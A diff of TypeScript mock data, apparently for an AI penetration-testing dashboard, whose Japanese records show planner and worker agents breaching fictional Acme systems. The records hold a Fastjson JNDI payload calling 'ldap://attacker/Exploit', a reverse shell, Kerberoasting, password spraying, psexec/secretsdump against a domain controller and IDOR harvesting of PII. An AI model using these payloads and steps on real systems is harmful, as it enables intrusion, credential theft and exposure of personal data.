@@ -731,10 +731,10 @@ export const findings: Finding[] = [
     severity: "critical",
     status: "confirmed",
     report:
-      "## 脆弱性の概要\n\n`shop.acme.com` の `/api/import` は **Fastjson 1.2.24** でユーザー入力の JSON を解析します。`safeMode` が無効で、`@type` に任意のクラスを指定して **JNDI インジェクション → リモートコマンド実行** が可能です。\n\n## 影響\n\n- 認証なしで DMZ の Web サーバー上の任意コマンドを実行可能（`www-data@dmz-web01`）\n- 権限昇格と組み合わせ、内部ネットワークへの足場となる\n\n## 再現手順\n\n1. JNDI ペイロードを作成：\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import`、`Content-Type: application/json`\n3. dnslog への接続とリバースシェルを確認\n\n## 修正案\n\n- Fastjson を **1.2.83 以降**へ更新し、`safeMode` を有効化\n- `/api/import` に認証と送信元検証を追加\n- 業務サーバーから外部 LDAP / RMI への接続を制限\n",
+      "## 脆弱性の概要\n\n`shop.acme.com` の `/api/import` は **Fastjson 1.2.24** でユーザー入力の JSON を解析します。`safeMode` が無効で、`@type` に任意のクラスを指定して **JNDI インジェクション → リモートコマンド実行** が可能です。\n\n## 影響\n\n- 認証なしで DMZ の Web サーバー上の任意コマンドを実行可能（`www-data@dmz-web01`）\n- 権限昇格と組み合わせ、内部ネットワークへの足場となる\n\n## 再現手順\n\n1. JNDI payloadを作成：\n\n```json\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/Exploit\",\"autoCommit\":true}\n```\n\n2. `POST /api/import`、`Content-Type: application/json`\n3. dnslog への接続とリバースshellを確認\n\n## 修正案\n\n- Fastjson を **1.2.83 以降**へ更新し、`safeMode` を有効化\n- `/api/import` に認証と送信元検証を追加\n- 業務サーバーから外部 LDAP / RMI への接続を制限\n",
     summary: "shop.acme.com Fastjson 1.2.24 のデシリアライズ RCE",
     evidence:
-      "POST /api/import に JNDI ペイロード（@type:JdbcRowSetImpl）を送信 → dnslog 接続とリバースシェル（www-data@dmz-web01）を確認。",
+      "POST /api/import に JNDI payload（@type:JdbcRowSetImpl）を送信 → dnslog 接続とリバースshell（www-data@dmz-web01）を確認。",
     intent_id: "i7",
     task_id: "t-acme-web",
     task_description: "Acme 公式サイトと管理画面の外部テスト",
@@ -787,7 +787,7 @@ export const findings: Finding[] = [
     vulnclass: "Kerberoasting",
     severity: "high",
     status: "pending",
-    summary: "ドメインサービスアカウント svc_sql が Kerberoasting 可能で、パスワードも脆弱",
+    summary: "ドメインサービスアカウント svc_sql が Kerberoast 可能で、パスワードも脆弱",
     evidence: "GetUserSPNs で svc_sql の TGS を要求し、hashcat -m 13100 で Sql@2020 を解析。SQL 管理グループのメンバー。",
     intent_id: "i12",
     task_id: "t-acme-web",
@@ -802,7 +802,7 @@ export const findings: Finding[] = [
     severity: "critical",
     status: "confirmed",
     report:
-      "## 脆弱性の概要\n\n外部の Fastjson RCE で DMZ に接続し、sudo による権限昇格、2枚の NIC、Jenkins の未認証 RCE を経て `svc_deploy` を取得。**Domain Admins** のメンバーであり、**DC01** を完全に制御できました。\n\n## 影響\n\n- ドメイン管理者権限で全ホストとアカウントを制御可能\n- `secretsdump` で `krbtgt` を含む全ドメインの NTLM ハッシュを取得し、ゴールデンチケットを作成可能\n- 内部の検証目標を達成\n\n## 再現手順\n\n1. `svc_deploy` でログインし、ハッシュを取得：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. DC01 の SYSTEM 権限でドメイン全体のハッシュを取得\n\n## 修正案\n\n- サービスアカウントを Domain Admins から除外し、階層管理を実施\n- `krbtgt` を連続2回リセットし、サービスアカウントのパスワードを強化・変更\n- DMZ と内部の分離、および前述の RCE / 権限昇格の経路を修正\n",
+      "## 脆弱性の概要\n\n外部の Fastjson RCE で DMZ に接続し、sudo による権限昇格、2枚の NIC、Jenkins の未認証 RCE を経て `svc_deploy` を取得。**Domain Admins** のメンバーであり、**DC01** を完全に制御できました。\n\n## 影響\n\n- ドメイン管理者権限で全ホストとアカウントを制御可能\n- `secretsdump` で `krbtgt` を含む全ドメインの NTLM ハッシュを取得し、ゴールデンチケットを作成可能\n- 内部の検証目標を達成\n\n## 再現手順\n\n1. `svc_deploy` でログインし、ハッシュを取得：\n\n```\npsexec.py acme/svc_deploy@10.10.10.10\nsecretsdump.py acme/svc_deploy@10.10.10.10\n```\n\n2. DC01 の SYSTEM 権限でドメイン全体のハッシュを取得\n\n## 修正案\n\n- サービスアカウントを Domain Admins から除外し、階層管理（tiering）を実施\n- `krbtgt` を連続2回リセットし、サービスアカウントのパスワードを強化・変更\n- DMZ と内部の分離、および前述の RCE / 権限昇格の経路を修正\n",
     summary: "DC01 を制御（Domain Admin）— 内部の検証目標を達成",
     evidence:
       "svc_deploy は Domain Admins に所属。psexec.py で DC01 の SYSTEM 権限を取得し、secretsdump で krbtgt を含む全域の NTLM ハッシュを取得。",
@@ -938,7 +938,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i7",
       type: "intent",
-      payload: P({ summary: "shop のデシリアライズ RCE を検証し、リバースシェルを取得" }),
+      payload: P({ summary: "shop のデシリアライズ RCE を検証し、リバースshellを取得" }),
       priority: 9,
       state: "done",
       origin: "planner",
@@ -958,7 +958,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "i9",
       type: "intent",
-      payload: P({ summary: "足場を中継して内部ホストを検出" }),
+      payload: P({ summary: "足場をpivotして内部ホストを検出" }),
       priority: 8,
       state: "done",
       origin: "planner",
@@ -1014,7 +1014,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa2",
       type: "fact",
-      payload: P({ summary: "search の q にエラーベースの注入点（MSSQL）" }),
+      payload: P({ summary: "search の q に error-based の注入点（MSSQL）" }),
       priority: 0,
       state: "open",
       origin: "work#4",
@@ -1050,7 +1050,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa4",
       type: "fact",
-      payload: P({ summary: "リバースシェル取得：www-data@dmz-web01（10.0.20.15）、DMZ 内" }),
+      payload: P({ summary: "リバースshell取得：www-data@dmz-web01（10.0.20.15）、DMZ 内" }),
       priority: 0,
       state: "open",
       origin: "work#7",
@@ -1104,7 +1104,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa10",
       type: "fact",
-      payload: P({ summary: "Kerberoasting で svc_sql の TGS を取得し、hashcat で Sql@2020 を解析" }),
+      payload: P({ summary: "Kerberoast で svc_sql の TGS を取得し、hashcat で Sql@2020 を解析" }),
       priority: 0,
       state: "open",
       origin: "work#12",
@@ -1305,7 +1305,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-24T09:12:25Z"),
     kind: "thinking",
     summary:
-      "graph_overview：g1「管理画面の権限取得」と g2「ユーザーの機密データの読み取り」は open。facts=0 で Worker の出力はまだありません。範囲は acme.com と /24 ネットワークです。www / admin / api / shop / vpn を入口と想定し、初期インテントを具体化するため最小限の読み取り専用調査を行います。",
+      "graph_overview：goals には目標層が分割した g1「acme.com 管理画面の権限取得」と g2「ユーザーの機密データの読み取り」があり、いずれも open。facts=0、recent_facts は空で、worker の出力はまだありません。範囲内の資産はルートドメイン acme.com と C セグメント1つです。www / admin / api / shop / vpn の5入口を想定しています。グラフに fact がないため、初期インテントを具体化する最小限の読み取り専用調査だけを行い、plan 内で作業を実行しません。",
   },
   {
     seq: 1002,
@@ -1315,7 +1315,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
-    detail: "初期情報が少ないため、3回以内の読み取り専用調査で探索方向を調整します。列挙と検証は Worker に任せます。",
+    detail: "初期情報が少ないため、3回以内の読み取り専用調査で探索方向を調整します。列挙と検証は worker に任せます。",
   },
   {
     seq: 1003,
@@ -1325,7 +1325,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary:
-      "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200、X-Powered-By なし、本文に element-ui / vue の特徴",
+      "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200、X-Powered-By なし、bodyに element-ui / vue の特徴",
     detail: "admin は独立したログイン画面です。5つの入口を確認し、初期インテントを具体化できます。",
   },
   {
@@ -1337,7 +1337,7 @@ export const activity: Activity[] = [
     tool_use_id: "p0-ai",
     summary: "add_intent × 4（最初の探索方向を一括割り当て）",
     detail:
-      "intents=[\n  { summary: 'acme.com のサブドメイン列挙と稼働ホストのポート / サービス識別', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com の既定 / 弱いパスワードをテスト', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q の SQL インジェクション調査', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com の注文 API の IDOR テスト', asset_ids: [api], priority: 8 },\n]\nparent_ids は空です（新しい最上位の方向として origin fact に接続）。",
+      "intents=[\n  { summary: 'acme.com のサブドメイン列挙と稼働ホストのポート / サービス識別', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com の既定 / 弱いパスワードをテスト（Element-UI のログイン、CAPTCHA なし）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q の SQL インジェクション調査', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com の注文 API の IDOR テスト', asset_ids: [api], priority: 8 },\n]\nparent_ids は空です（新しい最上位の方向として origin fact に接続）。",
   },
   {
     seq: 1005,
@@ -1347,7 +1347,7 @@ export const activity: Activity[] = [
     tool: "add_intent",
     tool_use_id: "p0-ai",
     summary: "4 intents created → ids=[i1, i2, i4, i5]、frontier に接続済み",
-    detail: "i1 の調査、i2 の認証経路、i4 / i5 のデータ経路を並行させ、早期に方向を絞りすぎません。",
+    detail: "経路の多様性を意識し、i1 の調査、i2（g1 の認証経路）、i4 / i5（g2 のデータ経路）という独立した2つの仕組みを並行させ、早期に方向を絞りすぎません。",
   },
   {
     seq: 1006,
@@ -1355,7 +1355,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-24T09:13:05Z"),
     kind: "text",
     summary:
-      "最初の4件を割り当てました：i1 資産調査、i2 管理画面のパスワード、i4 注入、i5 API の認可。g1 と g2 を独立した入口で進め、Worker の事実を待って追加します。",
+      "最初の4件を割り当てました：i1 資産調査、i2 管理画面のパスワード、i4 注入、i5 API の認可。g1 と g2 を独立した入口で進め、worker の事実を待って追加します。",
   },
 
   // ── 第 1 轮 · 攻击面加码（2026-07-25 14:12）──
@@ -1366,7 +1366,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:12:15Z"),
     kind: "thinking",
     summary:
-      "recent_facts に、復元した .git ソース、config.php の認証情報 sa/Acme@2021、shop の Fastjson 1.2.24 が追加されました。認証情報の再利用と RCE の2つの経路が考えられます。既存の認証 / 注入とは異なる DMZ への経路を検討するため、まず faGit の詳細を確認します。",
+      "recent_facts を確認：workG が faGit「.git をダウンロード可能で、git-dumper でバックエンドのソースを復元」と faCreds「config.php に sa/Acme@2021 をハードコード（内部で共通の可能性）」を返しました。work#6 の識別結果 fa3 は「shop に Fastjson 1.2.24 があり、既知のデシリアライズ RCE が存在」です。新しい仕組みは、内部で DB パスワードを再利用できる可能性と、Fastjson の確立した RCE 手法です。既存の認証 / 注入とは異なる、shop の RCE から DMZ に進む経路が開けました。まず faGit の詳細で復元内容を確認します。",
   },
   {
     seq: 1102,
@@ -1375,8 +1375,8 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p1-nd",
-    summary: "node_detail(faGit) — Worker が復元したソースを確認",
-    detail: "インテントを追加する前に、実際の復元内容を確認し、フィンガープリントだけで判断しません。",
+    summary: "node_detail(faGit) — workG が復元したソースを確認",
+    detail: "add_intent の前に worker が実際に復元した内容を確認し、フィンガープリントだけで判断しません。",
   },
   {
     seq: 1103,
@@ -1386,8 +1386,8 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p1-nd",
     summary:
-      "faGit の証拠：config.php / db.php / order_api.php を復元。config.php に $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
-    detail: "内部の 10.10.10.5（FS01）を参照しており、認証情報を内部で再利用できるという推測を裏付けます。",
+      "faGit の証拠：git-dumper で config.php / db.php / order_api.php を復元。config.php に $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
+    detail: "ハードコードされた接続先は内部の 10.10.10.5（FS01）で、faCreds の「内部で共通」という推測を裏付けます。RCE で接続した後、このパスワードの再利用を検討します。",
   },
   {
     seq: 1104,
@@ -1398,7 +1398,7 @@ export const activity: Activity[] = [
     tool_use_id: "p1-ai",
     summary: "add_intent × 2（Fastjson の経路で、先に実行できる段階を割り当て）",
     detail:
-      "intents=[\n  { summary: 'shop.acme.com の Fastjson 1.2.24 と CVE の正確な照合', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Fastjson のデシリアライズ RCE とリバースシェルを検証', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n識別→RCE→権限昇格を TodoWrite に記録し、シェル取得に依存する権限昇格は次回に回します。",
+      "intents=[\n  { summary: 'shop.acme.com の Fastjson 1.2.24 と CVE の正確な照合（gadget 経路を確認）', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Fastjson のデシリアライズ payload で shop の RCE とリバース shell を検証', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n識別→RCE→権限昇格を TodoWrite に記録し、shell取得に依存する権限昇格は次回に回します。",
   },
   {
     seq: 1105,
@@ -1415,7 +1415,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:13:00Z"),
     kind: "text",
     summary:
-      "ソース、内部の認証情報、Fastjson RCE から新しい経路ができました。g3「DMZ を経て内部への足場を確立」を登録し、i6 と i7 を割り当てます。権限昇格はシェル取得後に行います。",
+      "ソース、内部のハードコードされたパスワード、Fastjson RCE から新しい経路ができました。g3「外部から DMZ を突破して内部への足場を確立」を登録し、i6（識別 / CVE の照合）と i7（RCE の実行）を割り当てます。DMZ の権限昇格は shell 取得に依存するため、次回の作業として記録します。",
   },
 
   // ── 第 2 轮 · 立足点已建，转内网（2026-07-25 20:25）──
@@ -1432,7 +1432,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:25:18Z"),
     kind: "thinking",
     summary:
-      "i7 から DMZ のシェル fa4、権限昇格の fa5、内部へ接続する NIC の fa6 が返りました。g3 の条件は満たしていますが、prove_goal の前に fa6 の到達性を確認します。",
+      "経路を確認：i7 が fa4「DMZ 内のリバース shell www-data@dmz-web01（10.0.20.15）」を返し、権限昇格の経路が fa5「sudo -l で NOPASSWD python3 を確認し、root に昇格可能」と fa6「足場の第2 NIC が内部の 10.10.10.0/24 に直結」を返しました。g3 の条件（DMZ の突破と足場の確立）は fa4+fa6 で満たしています。prove_goal の前に fa6 の内部への到達性を確認します。",
   },
   {
     seq: 1202,
@@ -1450,7 +1450,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    summary: "fa6 の証拠：eth0 は 10.0.20.15（DMZ）、eth1 は 10.10.10.15（内部）。10.10.10.10 へ ping が通り、DMZ 境界を越えることを確認",
+    summary: "fa6 の証拠：ip a → eth0 10.0.20.15（DMZ）/ eth1 10.10.10.15（内部）。ping 10.10.10.10 が通り、DMZ 境界を越えることを確認",
   },
   {
     seq: 1204,
@@ -1461,7 +1461,7 @@ export const activity: Activity[] = [
     tool_use_id: "p2-pg",
     summary: "prove_goal(g3, evidence=fa6)",
     detail:
-      "reason：fa4 の DMZ シェル、fa5 の root 権限、fa6 の内部接続と DC01 への到達性により、g3 の達成を確認。",
+      "reason：i7 の RCE で DMZ の足場（fa4）を取得し、fa5 で root に昇格。fa6 が第2 NIC の内部への直接接続と DC01 への ping 成功を示し、「DMZ を突破して内部への足場を確立」の条件を達成。",
   },
   {
     seq: 1205,
@@ -1479,9 +1479,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p2-ai",
-    summary: "add_intent × 4（足場を中継し、内部の水平移動を調査）",
+    summary: "add_intent × 4（足場をpivotし、内部の水平移動を調査）",
     detail:
-      "intents=[\n  { summary: 'dmz-web01 を中継し、10.10.10.0/24 のホストとポートを調査', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内部で sa/Acme@2021 の認証情報の再利用を検証', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins の未認証 /script の Groovy RCE を検証', parent_ids: [fa6], priority: 9 },\n  { summary: 'ドメインサービスアカウントの Kerberoasting と解析', parent_ids: [fa6], priority: 8 },\n]\nホスト検出を先行し、残りの3経路を並行して探索します。",
+      "intents=[\n  { summary: 'dmz-web01 をpivotし、10.10.10.0/24 のホストとポートを調査', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内部で sa/Acme@2021 の認証情報の再利用を検証', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins の未認証 /script の Groovy RCE を検証', parent_ids: [fa6], priority: 9 },\n  { summary: 'ドメインサービスアカウントの Kerberoasting と解析', parent_ids: [fa6], priority: 8 },\n]\nホスト検出を先行し、残りの3経路を並行して探索します。",
   },
   {
     seq: 1207,
@@ -1498,7 +1498,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:26:20Z"),
     kind: "text",
     summary:
-      "g3 を達成し、対象を内部に拡張しました。g4「DC01 の制御」を登録し、ホスト検出と3つの水平移動経路を割り当てました。認証情報の再利用は faCreds に紐づけます。",
+      "g3 を達成し、攻撃対象を外部から内部に拡張しました。g4「内部で水平移動し、対象のドメインコントローラー DC01 を制御」を登録し、i9（ホスト検出）と i10 / i11 / i12 の3つの水平移動経路を並行して割り当てました。認証情報の再利用は faCreds に紐づけ、外部のソースから漏えいしたパスワードを内部の水平移動に使用します。",
   },
 
   // ── 第 3 轮 · 靶标达成复盘（2026-07-26 00:25）──
@@ -1509,7 +1509,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
     summary:
-      "Worker から内部ホスト、Jenkins の未認証 Groovy、svc_deploy の平文パスワード、svc_sql の解析結果が返りました。svc_deploy は Domain Admins に所属し、i13 が DC01 を制御しました。g4 の達成を確定する前に証拠を確認します。",
+      "今回の worker の出力を確認：i9→fa7「内部で DC01/FS01/JENKINS が稼働」、i11→fa8「Jenkins /script の未認証 Groovy」と fa9「Jenkins の認証情報ストアから acme\\svc_deploy の平文パスワードを取得」、i12→fa10「svc_sql の TGS を Kerberoast し、hashcat で Sql@2020 を解析」。svc_deploy は Domain Admins に所属し、i13 が psexec で DC01 を制御して secretsdump を実行済みです。g4 の条件（DC01 の制御）は達成したと考えられますが、確定前に finding の証拠経路を確認します。",
   },
   {
     seq: 1302,
@@ -1528,7 +1528,7 @@ export const activity: Activity[] = [
     tool: "list_findings",
     tool_use_id: "p3-lf",
     summary:
-      "F-09「DC01 の完全な制御 / 全域ハッシュ取得」は critical。psexec と NTDS.dit の証拠があり、fa9→fa10→i13 の経路も完全",
+      "F-09「ドメインコントローラー DC01 の完全な制御 / secretsdump による全ドメインのハッシュ取得」は critical（証拠：psexec svc_deploy@10.10.10.10 + NTDS.dit dump）。上流の fa9→fa10→i13 の経路も完全",
   },
   {
     seq: 1304,
@@ -1539,7 +1539,7 @@ export const activity: Activity[] = [
     tool_use_id: "p3-pg",
     summary: "prove_goal(g4, evidence=F-09)",
     detail:
-      "reason：Jenkins から取得した svc_deploy で DC01 を制御し、全域ハッシュを取得。F-09 で g4 の達成を確認。",
+      "reason：Jenkins から svc_deploy（Domain Admin）が漏えい → psexec で DC01 を制御 → secretsdump で全ドメインのハッシュを取得。F-09 で確認済みで、「内部の対象ドメインコントローラー DC01 を制御」の条件を達成。",
   },
   {
     seq: 1305,
@@ -1556,7 +1556,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:26:10Z"),
     kind: "text",
     summary:
-      "外部 RCE → DMZ → 内部 → DC01 の経路を確認しました。g2 は未完了ですが、i3 と i5 が実行中で対象をカバーしています。新しい独立した方向はなく、追加せずに結果を待ちます。",
+      "g4 を完了し、外部 RCE → DMZ → 内部 → ドメインコントローラーの経路を確認しました。未調査の方向を確認すると、g2「ユーザーの機密データの読み取り」は未完了ですが、i3（管理画面のユーザー API）と i5（API IDOR）がカバーしており、どちらも running です。新しい独立した未調査の方向はないため、追加インテントは0件とし、i3 / i5 の出力を待ちます。",
   },
 
   // ── 第 4 轮 · 后台达成，收敛 g2（2026-07-26 03:55）──
@@ -1573,7 +1573,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:14Z"),
     kind: "thinking",
     summary:
-      "Worker が Acme@2021 で admin にログインし、i2 を完了しました。g1 を達成とします。g2 はまだ大量のユーザーデータを取得していないため達成とはせず、取得のインテントを高優先度にします。",
+      "recent_facts を確認：work#2 が faCreds の Acme@2021 で admin 管理画面へのログインに成功（i2 done）し、管理権限を取得しました。g1 の条件を満たしたため、まず prove_goal で確定します。その後、g2「ユーザーの機密データの読み取り」を量的に検証します。i3 / i5 は API を調べただけで大量のデータは未取得のため、まだ条件を満たしていません。prove_goal は行わず、データ取得のインテントの優先度を上げて不足を補います。",
   },
   {
     seq: 1402,
@@ -1584,7 +1584,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
     detail:
-      "reason：i2 が漏えいしたパスワード Acme@2021 で admin にログインし、管理権限を取得。g1 を達成。",
+      "reason：i2 が外部で漏えいしたハードコード済みパスワード Acme@2021 で admin 管理画面（Element-UI）にログインし、管理権限を取得。g1 を達成。",
   },
   {
     seq: 1403,
@@ -1601,7 +1601,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:40Z"),
     kind: "thinking",
     summary:
-      "g2 は実際のユーザーデータの取得が必要です。graph_overview に取得成功の記録はなく、i3 / i5 も実行中です。管理画面へのログインだけでは met にせず、差分を埋めます。",
+      "g2 を量的に検証：「ユーザーの機密データの読み取り」には、実際のユーザーレコードの一括取得が必要です。graph_overview の findings に「ユーザーデータのエクスポート成功」はなく、i3 / i5 はいずれも running で取得結果も未報告のため、条件を満たしていません。「管理画面に入れたので概ね達成」として先に met にせず、不足を補うインテントを割り当てます。",
   },
   {
     seq: 1405,
@@ -1612,7 +1612,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-ai",
     summary: "add_intent × 2（g2 のデータ取得に集中し、優先度を上げる）",
     detail:
-      "intents=[\n  { summary: 'admin のユーザー管理 / エクスポート API から機密フィールドを取得', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com の IDOR で order_id を列挙し、注文 / PII を取得', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n実行中の i3 / i5 の説明を具体化し、優先度を9へ更新します。重複するインテントは作成しません。",
+      "intents=[\n  { summary: 'admin のユーザー管理 / エクスポート API から機密フィールドを取得', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com の IDOR で order_id を列挙し、注文 / PII を取得', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nrunning の i3 / i5 の説明を具体化し、優先度を9へ更新します。重複するインテントは作成しません。",
   },
   {
     seq: 1406,
@@ -1629,7 +1629,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:58Z"),
     kind: "text",
     summary:
-      "g1 / g3 / g4 の3目標を達成しました。g2 は実際のデータ取得を確認して判定します。i3 / i5 を優先度9に更新し、Worker の結果を待ちます。",
+      "g1 を達成（4目標のうち g1 / g3 / g4 の3つが met）。g2 は量的な条件を厳守し、管理画面に入れただけでは達成とせず、ユーザーデータの一括取得を確認して確定します。i3 / i5 を priority 9 に上げ、データ取得の説明を具体化済みです。worker の結果を待ち、タスク全体を完了します。",
   },
 
   // work#1 · i1 子域枚举与端口扫描（done）
@@ -1766,7 +1766,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
-    detail: "admin/admin123 でログインに成功し、セッション Cookie を取得。",
+    detail: "admin/admin123 でログインに成功し、セッション cookie を取得。",
   },
   {
     seq: 25,
@@ -1984,7 +1984,7 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T03:58:10Z"),
     kind: "thinking",
-    summary: "ID の範囲を列挙してアクセス可能なデータ量を評価中です（ブロックを避けるため、まだエクスポートはしません）。",
+    summary: "id の範囲を列挙してアクセス可能なデータ量を評価中です（ブロックを避けるため、まだエクスポートはしません）。",
   },
 
   // work#3 · i3 后台用户接口枚举（running）
@@ -2139,7 +2139,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t6a",
     summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...",
-    detail: "Java を使用し、/api/import が JSON 本文を受け付けます。",
+    detail: "Java を使用し、/api/import が JSON bodyを受け付けます。",
   },
   {
     seq: 323,
@@ -2183,7 +2183,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:12:00Z"),
     kind: "thinking",
-    summary: "JNDI / LDAP サービスで接続を検証し、dnslog の後にリバースシェルを確認します。",
+    summary: "JNDI / LDAP サービスを起動し、shop が接続して payload を読み込み実行するようにします。まず dnslog で外向きの通信を検証し、次にリバース shell を確認します。",
   },
   {
     seq: 331,
@@ -2226,7 +2226,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t7b",
     summary: "LDAP がリクエストを受信 → ReverseShell を読み込み → nc が接続を受信",
-    detail: "ペイロードの実行に成功。",
+    detail: "payloadの実行に成功。",
   },
   {
     seq: 335,
@@ -2236,7 +2236,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "bash",
     tool_use_id: "t7c",
-    summary: "id; hostname -I  # シェル内の権限とネットワークを確認",
+    summary: "id; hostname -I  # shell内の権限とネットワークを確認",
   },
   {
     seq: 336,
@@ -2265,7 +2265,7 @@ export const activity: Activity[] = [
     intent_id: "i7",
     ts: T("2026-07-25T15:40:00Z"),
     kind: "result",
-    summary: "RCE で www-data のシェルを取得し、目標③の足場を確立しました。",
+    summary: "RCE で www-data のshellを取得し、目標③の足場を確立しました。",
     input_tokens: 132000,
     output_tokens: 8600,
     cache_read_tokens: 90000,
@@ -2339,7 +2339,7 @@ export const activity: Activity[] = [
     intent_id: "i8",
     ts: T("2026-07-25T16:20:00Z"),
     kind: "result",
-    summary: "root への権限昇格を完了。内部調査の中継として使用します。",
+    summary: "root への権限昇格を完了。内部調査のpivotとして使用します。",
     input_tokens: 74000,
     output_tokens: 4700,
     cache_read_tokens: 50000,
@@ -2396,7 +2396,7 @@ export const activity: Activity[] = [
     intent_id: "i10",
     ts: T("2026-07-26T03:42:00Z"),
     kind: "thinking",
-    summary: "ソースから取得した sa/Acme@2021 の再利用を DC01 / FS01 / JENKINS で検証します。",
+    summary: "ソースから漏えいした sa/Acme@2021 は DB パスワードです。企業でよくあるパスワードの再利用を想定し、DC01 / FS01 / JENKINS でパスワードスプレーを検証します。",
   },
   {
     seq: 361,
@@ -2530,7 +2530,7 @@ export const activity: Activity[] = [
     intent_id: "i12",
     ts: T("2026-07-25T22:42:00Z"),
     kind: "thinking",
-    summary: "svc_deploy で認証し、GetUserSPNs でサービスアカウントの TGS を要求します。",
+    summary: "svc_deploy の認証情報でドメイン認証し、GetUserSPNs で Kerberoast 可能なサービスアカウントの TGS を要求します。",
   },
   {
     seq: 381,
@@ -2685,7 +2685,7 @@ export const activity: Activity[] = [
     intent_id: "i13",
     ts: T("2026-07-26T00:20:00Z"),
     kind: "result",
-    summary: "DC01 の制御と全域ハッシュの取得を確認し、目標を達成しました。",
+    summary: "ドメインコントローラー DC01 を制御し、secretsdump で全ドメインのハッシュを取得。対象の目標を達成しました。",
     input_tokens: 144000,
     output_tokens: 9200,
     cache_read_tokens: 96000,
@@ -2700,7 +2700,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:18:06Z"),
     kind: "text",
     summary:
-      "admin.acme.com は Element-UI で、CAPTCHA とレート制限がありません。既定パスワードから調査するインテントを高優先度で割り当てました。",
+      "admin.acme.com は Element-UI の管理画面で、CAPTCHA とレート制限がありません。まず既定のパスワード一覧（admin/admin123）、その後に辞書を試す方向を推奨します。work agent に高優先度のインテントを追加しました。",
   },
   { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "管理画面に入れました。次の重点は？" },
   {
@@ -2716,7 +2716,7 @@ export const activity: Activity[] = [
     worker: "mainagent",
     ts: T("2026-07-25T15:42:00Z"),
     kind: "user",
-    summary: "シェルを取得しました。次は？",
+    summary: "shellを取得しました。次は？",
   },
   {
     seq: 401,
@@ -2724,7 +2724,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T15:42:10Z"),
     kind: "text",
     summary:
-      "まず www-data からの権限昇格を確認します。root 取得後、DMZ から内部の DC と Jenkins を調査します。",
+      "www-data の権限では不十分なので、まず権限昇格を確認します（sudo -l に可能性があります）。root 取得後、DMZ を経由して内部のホストを検出し、ドメインコントローラーと Jenkins を優先します。",
   },
   {
     seq: 402,
